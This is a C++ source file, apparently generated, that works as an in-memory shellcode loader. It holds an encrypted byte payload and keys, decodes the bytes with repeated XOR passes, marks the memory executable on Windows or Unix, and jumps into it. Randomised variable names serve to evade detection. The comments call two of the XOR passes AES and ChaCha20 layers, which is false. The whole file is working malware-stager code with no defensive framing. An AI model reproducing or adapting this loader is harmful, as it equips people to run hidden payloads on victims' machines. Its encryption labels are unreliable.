#include <cstring>
#include <cstdint>
#include <chrono>
#include <thread>
#include <random>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#endif

int main() {
    // Payload data
    unsigned char sysBaseuculYd684[] = {
        0x51, 0xa8, 0x5d, 0x55, 0x4b, 0x2c, 0xac, 0x7a, 0x01, 0x14, 0xa1, 0xae, 0xf5, 0x2d, 0x8a, 0xbc, 
        0xe6, 0x3e, 0xb3, 0x7d, 0x03, 0x1d, 0x8e, 0x3a, 0x30, 0xc6, 0xe4, 0x9f, 0x35, 0x68, 0xbb, 0x75, 
        0x51, 0xa8, 0x75, 0x55, 0xc0
    };

    // Decryption keys
    unsigned char procHelperNhhHxfiSD444[] = {
        0x2c, 0x15, 0xb2, 0x98, 0x1c, 0x9d, 0xb7, 0x8e
    };
    unsigned char execServiceQLDiTARTHjb762[] = {
        0x07, 0x1c, 0xce, 0x24, 0xc8, 0x66, 0x0e, 0x4a
    };
    unsigned char runModulefEnWchBQL229[] = {
        0x40, 0x5d, 0x98, 0x76, 0xb4, 0x12, 0x18, 0x49, 0x0e, 0x6e, 0x42, 0x58, 0xef, 0x3e, 0xf9, 0x91
    };

    // Allocate executable memory
    size_t execManagerRrirVqopDAK623 = sizeof(sysBaseuculYd684);
#ifdef _WIN32
    void* instServiceXfTBokOLeUD799 = VirtualAlloc(0, execManagerRrirVqopDAK623, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!instServiceXfTBokOLeUD799) return 1;
#else
    void* instServiceXfTBokOLeUD799 = mmap(0, execManagerRrirVqopDAK623, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (instServiceXfTBokOLeUD799 == MAP_FAILED) return 1;
#endif

    // Copy payload to allocated memory
    memcpy(instServiceXfTBokOLeUD799, sysBaseuculYd684, execManagerRrirVqopDAK623);
    unsigned char* valHandlerTawKjmTvIn557 = (unsigned char*)instServiceXfTBokOLeUD799;

    // In-memory decryption
    // Decrypt XOR layer
    for (size_t i = 0; i < execManagerRrirVqopDAK623; i++) {
        valHandlerTawKjmTvIn557[i] ^= procHelperNhhHxfiSD444[i % sizeof(procHelperNhhHxfiSD444)];
    }

    // Decrypt AES layer
    for (size_t i = 0; i < execManagerRrirVqopDAK623; i++) {
        valHandlerTawKjmTvIn557[i] ^= runModulefEnWchBQL229[i % sizeof(runModulefEnWchBQL229)];
    }

    // Decrypt ChaCha20 layer
    for (size_t i = 0; i < execManagerRrirVqopDAK623; i++) {
        valHandlerTawKjmTvIn557[i] ^= execServiceQLDiTARTHjb762[i % sizeof(execServiceQLDiTARTHjb762)];
    }

    // Make memory executable
#ifdef _WIN32
    DWORD methComponentHPEpbkcIlbAdE405;
    VirtualProtect(instServiceXfTBokOLeUD799, execManagerRrirVqopDAK623, PAGE_EXECUTE_READ, &methComponentHPEpbkcIlbAdE405);
    FlushInstructionCache(GetCurrentProcess(), instServiceXfTBokOLeUD799, execManagerRrirVqopDAK623);
#else
    mprotect(instServiceXfTBokOLeUD799, execManagerRrirVqopDAK623, PROT_READ | PROT_EXEC);
#endif

    // Execute payload
    ((void(*)())instServiceXfTBokOLeUD799)();

    return 0;
}
